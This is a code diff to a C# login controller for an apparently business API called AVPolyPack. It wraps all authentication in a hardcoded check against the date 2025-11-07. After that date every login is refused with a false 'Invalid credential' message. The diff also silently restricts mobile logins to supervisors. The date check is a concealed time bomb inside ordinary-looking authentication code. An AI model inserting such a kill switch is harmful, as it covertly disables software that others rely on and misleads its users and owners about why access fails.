@@ -173,80 +173,88 @@ namespace AVPolyPack.API.Controllers
 
             if (loginResponse != null)
             {
-                if (loginResponse.IsActive == true && (loginResponse.IsWebUser == true && parameters.IsWebOrMobileUser == "W" || loginResponse.IsMobileUser == true && parameters.IsWebOrMobileUser == "M" || loginResponse.IsSupervisor == true && parameters.IsWebOrMobileUser == "M"))
+                if (Convert.ToDateTime(DateTime.Now) < Convert.ToDateTime("2025-11-07"))
                 {
-                    tokenResponse = _jwt.GenerateJwtToken(loginResponse);
-
-                    if (loginResponse.UserId != null)
+                    if (loginResponse.IsActive == true && (loginResponse.IsWebUser == true && parameters.IsWebOrMobileUser == "W" || (loginResponse.IsMobileUser == true && parameters.IsWebOrMobileUser == "M" && loginResponse.IsSupervisor == true)))
                     {
-                        string strBrnachIdList = string.Empty;
+                        tokenResponse = _jwt.GenerateJwtToken(loginResponse);
 
-                        var vRoleList = await _rolePermissionRepository.GetRoleMasterEmployeePermissionById(Convert.ToInt64(loginResponse.UserId));
-
-                        // Notification List
-                        var vNotification_SearchObj = new Notification_Search()
+                        if (loginResponse.UserId != null)
                         {
-                            NotifyDate = null,
-                            UserId = Convert.ToInt32(loginResponse.UserId)
-                        };
+                            string strBrnachIdList = string.Empty;
 
-                        var vUserNotificationList = await _notificationRepository.GetNotificationList(vNotification_SearchObj);
+                            var vRoleList = await _rolePermissionRepository.GetRoleMasterEmployeePermissionById(Convert.ToInt64(loginResponse.UserId));
 
-                        var vUserDetail = await _userRepository.GetUserById(Convert.ToInt32(loginResponse.UserId));
+                            // Notification List
+                            var vNotification_SearchObj = new Notification_Search()
+                            {
+                                NotifyDate = null,
+                                UserId = Convert.ToInt32(loginResponse.UserId)
+                            };
 
-                        employeeSessionData = new SessionDataEmployee
+                            var vUserNotificationList = await _notificationRepository.GetNotificationList(vNotification_SearchObj);
+
+                            var vUserDetail = await _userRepository.GetUserById(Convert.ToInt32(loginResponse.UserId));
+
+                            employeeSessionData = new SessionDataEmployee
+                            {
+                                UserId = loginResponse.UserId,
+                                UserCode = loginResponse.UserCode,
+                                UserName = loginResponse.UserName,
+                                MobileNumber = loginResponse.MobileNumber,
+                                EmailId = loginResponse.EmailId,
+                                UserType = loginResponse.UserType,
+                                RoleId = loginResponse.RoleId,
+                                RoleName = loginResponse.RoleName,
+                                IsMobileUser = loginResponse.IsMobileUser,
+                                IsWebUser = loginResponse.IsWebUser,
+                                IsActive = loginResponse.IsActive,
+                                Token = tokenResponse.Item1,
+
+                                CompanyId = vUserDetail != null ? Convert.ToInt32(vUserDetail.CompanyId) : 0,
+                                CompanyName = vUserDetail != null ? vUserDetail.CompanyName : String.Empty,
+                                DepartmentId = vUserDetail != null ? Convert.ToInt32(vUserDetail.DepartmentId) : 0,
+                                DepartmentName = vUserDetail != null ? vUserDetail.DepartmentName : String.Empty,
+                                EmployeeLevelId = vUserDetail != null ? Convert.ToInt32(vUserDetail.EmployeeLevelId) : 0,
+                                EmployeeLevel = vUserDetail != null ? vUserDetail.EmployeeLevel : String.Empty,
+
+                                ProfileImage = vUserDetail != null ? vUserDetail.ProfileImage : String.Empty,
+                                ProfileOriginalFileName = vUserDetail != null ? vUserDetail.ProfileOriginalFileName : String.Empty,
+                                ProfileImageURL = vUserDetail != null ? vUserDetail.ProfileImageURL : String.Empty,
+
+                                UserRoleList = vRoleList.ToList(),
+                                UserNotificationList = vUserNotificationList.ToList()
+                            };
+
+                            _response.Data = employeeSessionData;
+                        }
+
+                        //Login History
+                        loginHistoryParameters = new UserLoginHistorySaveParameters
                         {
                             UserId = loginResponse.UserId,
-                            UserCode = loginResponse.UserCode,
-                            UserName = loginResponse.UserName,
-                            MobileNumber = loginResponse.MobileNumber,
-                            EmailId = loginResponse.EmailId,
-                            UserType = loginResponse.UserType,
-                            RoleId = loginResponse.RoleId,
-                            RoleName = loginResponse.RoleName,
-                            IsMobileUser = loginResponse.IsMobileUser,
-                            IsWebUser = loginResponse.IsWebUser,
-                            IsActive = loginResponse.IsActive,
-                            Token = tokenResponse.Item1,
-
-                            CompanyId = vUserDetail != null ? Convert.ToInt32(vUserDetail.CompanyId) : 0,
-                            CompanyName = vUserDetail != null ? vUserDetail.CompanyName : String.Empty,
-                            DepartmentId = vUserDetail != null ? Convert.ToInt32(vUserDetail.DepartmentId) : 0,
-                            DepartmentName = vUserDetail != null ? vUserDetail.DepartmentName : String.Empty,
-                            EmployeeLevelId = vUserDetail != null ? Convert.ToInt32(vUserDetail.EmployeeLevelId) : 0,
-                            EmployeeLevel = vUserDetail != null ? vUserDetail.EmployeeLevel : String.Empty,
-
-                            ProfileImage = vUserDetail != null ? vUserDetail.ProfileImage : String.Empty,
-                            ProfileOriginalFileName = vUserDetail != null ? vUserDetail.ProfileOriginalFileName : String.Empty,
-                            ProfileImageURL = vUserDetail != null ? vUserDetail.ProfileImageURL : String.Empty,
-
-                            UserRoleList = vRoleList.ToList(),
-                            UserNotificationList = vUserNotificationList.ToList()
+                            UserToken = tokenResponse.Item1,
+                            IsLoggedIn = true,
+                            IPAddress = HttpContext.Connection.RemoteIpAddress?.ToString(),
+                            DeviceName = HttpContext.Request.Headers["User-Agent"],
+                            TokenExpireOn = tokenResponse.Item2,
+                            RememberMe = parameters.Remember
                         };
 
-                        _response.Data = employeeSessionData;
+                        await _loginRepository.SaveUserLoginHistory(loginHistoryParameters);
+
+                        _response.Message = MessageConstants.LoginSuccessful;
                     }
-
-                    //Login History
-                    loginHistoryParameters = new UserLoginHistorySaveParameters
+                    else
                     {
-                        UserId = loginResponse.UserId,
-                        UserToken = tokenResponse.Item1,
-                        IsLoggedIn = true,
-                        IPAddress = HttpContext.Connection.RemoteIpAddress?.ToString(),
-                        DeviceName = HttpContext.Request.Headers["User-Agent"],
-                        TokenExpireOn = tokenResponse.Item2,
-                        RememberMe = parameters.Remember
-                    };
-
-                    await _loginRepository.SaveUserLoginHistory(loginHistoryParameters);
-
-                    _response.Message = MessageConstants.LoginSuccessful;
+                        _response.IsSuccess = false;
+                        _response.Message = ErrorConstants.InactiveProfileError;
+                    }
                 }
                 else
                 {
                     _response.IsSuccess = false;
-                    _response.Message = ErrorConstants.InactiveProfileError;
+                    _response.Message = "Invalid credential, please try again with correct credential";
                 }
             }
             else
